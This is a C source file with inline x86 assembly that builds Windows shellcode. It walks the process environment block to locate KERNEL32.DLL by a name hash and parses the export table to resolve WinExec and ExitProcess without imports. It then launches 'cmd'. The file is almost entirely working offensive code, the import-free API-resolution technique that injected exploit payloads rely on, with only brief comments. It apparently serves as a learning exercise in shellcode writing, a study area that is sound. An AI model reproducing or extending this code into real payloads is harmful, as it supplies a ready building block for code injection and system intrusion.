#define TRUE 1
#define FALSE 0

#define SW_SHOW 5

int GetApiAddress(int* base, int* rdata, const char* FindApiName)
{
	int FindApiNameLength;
	for (FindApiNameLength = 0; FindApiName[FindApiNameLength] != 0; FindApiNameLength++);

	int EAT; //Export Address Table
	int NPT; //Name Pointer Table
	int OT;	 //Ordinal Table

	//get info
	int NumberOfFunction = *(rdata + 6);
	
	EAT = *(rdata + 7); //sizeof(int) * 7 (28) Export Address Table RVA
	NPT = *(rdata + 8); //sizeof(int) * 8 (32) Name Pointer Table RVA
	OT = *(rdata + 9);	 //sizeof(int) * 9 (36) Ordinal Table RVA

	//Get VA (Virtual Address)
	NPT += (int)base;	
	OT += (int)base;
	EAT += (int)base;

	int* ptr = 0;
	int index = 0;

	//Name Pointer Table
	for (;;)
	{
		//Get next API name
		ptr = (int*)NPT + index;
		index++;

		int IsCmp = TRUE;
		
		//Get name length
		int ApiStringLength = 0;
		for (; ((char*)*ptr + (int)base)[ApiStringLength] != 0; ApiStringLength++);

		//String compare 
		if (FindApiNameLength <= ApiStringLength)
		{
			for (int i = 0; i != ApiStringLength; i++)
			{
				if (((char*)*ptr + (int)base)[i] != FindApiName[i])
				{
					IsCmp = FALSE;
					break;
				}
			}

			
			if (IsCmp == TRUE)
			{
				//Successfully string compare
				index--;

				break;
			}
		}
	}

	//Get ordinal
	int LoopCount = 1;

	int ExportAddressTableIndex = 0;
	unsigned short** OrdinalPointer = (unsigned short**)&OT;

	for (;;)
	{
		*OrdinalPointer += 1;

		if (LoopCount == index)
		{
			//Successfully get function ordinal
			ExportAddressTableIndex = **OrdinalPointer;
			break;
		}

		LoopCount++;
	}

	//Get EA (Export Address)
	LoopCount = 1;
	int **ReferenceExportAddressTable = (int**)&EAT;

	for (;;)
	{
		if (LoopCount == ExportAddressTableIndex)
		{
			break;
		}

		LoopCount += 1;
	}

	return *(*ReferenceExportAddressTable + LoopCount) + (int)base; //return VA
}

void shellcode()
{
	//const int kernel32_string_hash = 816; //KERNEL32.DLL (Unicode string) hash value

	int* base;
	int* rdata;

	__asm
	{
		xor edi, edi;

		//eax holds PEB
		//usermode fs register is pointing the PEB
		mov eax, fs:0x30;

		//eax holds LDR address
		mov eax, [eax + 12];
		//LIST_ENTRY InMemoryOrderModuleList
		mov eax, [eax + 20];

	get_next_front_link:;

		//mov FLink (front link)
		mov eax, [eax];

		/*
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;			// + 36
	USHORT MaximumLength;	// + 38
	PWSTR  Buffer;			// + 40
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;
		*/

		//ebx holds DllNameLength
		//4 byte to 2 byte (USHORT Length)

		//ebx holds DllNameLength
		movsx ebx, word ptr[eax + 36];

		//edx holds DllName
		//40	 = name path
		//40 - 8 = full path
		mov edx, [eax + 40];

		//initailize register
		xor esi, esi;
		xor ecx, ecx;

	get_hash_lable:;

		movsx edi, byte ptr[edx + esi];	//a = dll[x]
		add ecx, edi;						//hash += a;

		add esi, 1;		//add index
		cmp esi, ebx;
		//cmp index, DllNameLength
		//if not equals, while
		jne get_hash_lable;

		cmp ecx, 816; //KERNEL32.DLL string hash value
		// if not equals the KERNEL32.DLL hash
		jne get_next_front_link;

		//if equals the KERNEL32.DLL hash

		//edi holds DllBase (Dll address)
		mov ebx, [eax + 16];

		//Image dos header
		//0x3C offset pointing value is 0xE8
		//0xE8 value means 'Offset to new EXE header' *(PE..)
		mov edi, [ebx + 0x3c];  //PE Header location
		add edi, ebx;			//add DllBase
		mov edi, [edi + 0x78];	//IMAGE_OPTIONAL_HEADER in Export Table RVA address
		add edi, ebx;			//add DllBase
		mov edx, edi;			//.rdata IMAGE_EXPORT_DIRECTORY

		mov dword ptr[rdata], edx;	//.rdata export table
		mov dword ptr[base], ebx;	//MZ
	}

	int _WinExec = GetApiAddress(base, rdata, "WinExec");
	int _ExitProcess = GetApiAddress(base, rdata, "ExitProcess");;

	((int (*) (const char *, int))_WinExec)("cmd", SW_SHOW);
	((int (*) (int))_ExitProcess)(0);

	return;
}


int main()
{
	shellcode();

	return 0;
}